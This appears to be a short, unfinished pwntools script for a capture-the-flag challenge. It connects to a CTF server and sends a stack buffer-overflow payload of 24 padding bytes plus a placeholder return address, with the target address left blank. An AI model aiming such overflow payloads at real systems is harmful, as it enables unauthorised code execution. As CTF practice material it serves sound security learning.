from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9002)

# win = 

payload = b"A" * 24
payload += p64(0xdeadbeef)
#payload += p64()

target.sendline(payload)
print(target.recvall().decode())
# target.interactive()